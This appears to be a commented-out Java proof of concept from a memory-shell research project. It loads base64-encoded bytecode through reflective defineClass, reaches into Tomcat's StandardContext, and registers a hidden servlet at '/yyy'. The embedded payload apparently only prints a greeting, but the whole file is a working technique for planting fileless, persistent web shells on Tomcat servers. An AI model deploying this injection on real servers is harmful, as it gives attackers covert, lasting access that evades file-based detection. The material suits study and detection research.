//package com.memshell.tomcat;
//
//import org.apache.catalina.Wrapper;
//import org.apache.catalina.core.ApplicationContext;
//import org.apache.catalina.core.ApplicationServletRegistration;
//import org.apache.catalina.core.StandardContext;
//import org.apache.catalina.util.Introspection;
//import sun.misc.BASE64Decoder;
//import javax.servlet.ServletContext;
//import javax.servlet.ServletRegistration;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.lang.reflect.Modifier;
//
//public class ServletBasedBasicVariant extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//
//        // 很多 tomcat 版本报错，需要修改下代码
//
//        try{
//            // 将 Servlet Class 通过 defineClass 加载进来
//            // 内容是 com.memshell.generic.DynamicServletTemplate
//            String code = "yv66vgAAADMAJAoABgAWCQAXABgIABkKABoAGwcAHAcAHQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAtTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNTZXJ2bGV0VGVtcGxhdGU7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApTb3VyY2VGaWxlAQAbRHluYW1pY1NlcnZsZXRUZW1wbGF0ZS5qYXZhDAAHAAgHAB4MAB8AIAEAKkknbSBTZXJ2bGV0IEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcAIQwAIgAjAQArY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY1NlcnZsZXRUZW1wbGF0ZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAgABAAcACAABAAkAAAAvAAEAAQAAAAUqtwABsQAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAABAAOAA8AAQAJAAAASwACAAMAAAAJsgACEgO2AASxAAAAAgAKAAAACgACAAAADQAIAA4ACwAAACAAAwAAAAkADAANAAAAAAAJABAAEQABAAAACQASABMAAgABABQAAAACABU=";
//            BASE64Decoder base64Decoder = new BASE64Decoder();
//            ClassLoader currentClassloader = Thread.currentThread().getContextClassLoader();
//            Method method = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass()
//                    .getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//            System.out.println(method);
//            method.setAccessible(true);
//            method.invoke(currentClassloader, base64Decoder.decodeBuffer(code), 0, base64Decoder.decodeBuffer(code).length);
//
//            //获取 StandardContext
//            ServletContext servletContext = req.getServletContext();
//            Field field = servletContext.getClass().getDeclaredField("context");
//            field.setAccessible(true);
//            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
//
//            field = applicationContext.getClass().getDeclaredField("context");
//            field.setAccessible(true);
//            Field modifiersField = Field.class.getDeclaredField("modifiers");
//            modifiersField.setAccessible(true);
//            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
//            StandardContext standardContext = (StandardContext) field.get(applicationContext);
//
//            Wrapper wrapper = standardContext.createWrapper();
//            wrapper.setName("myServletName2");
//            standardContext.addChild(wrapper);
//
//            wrapper.setServletClass("com.memshell.generic.DynamicServletTemplate");
//            Introspection.loadClass(standardContext, "com.memshell.generic.DynamicServletTemplate");
//            ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
//            registration.addMapping("/yyy");
//
//            System.out.println("Done");
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//    }
//}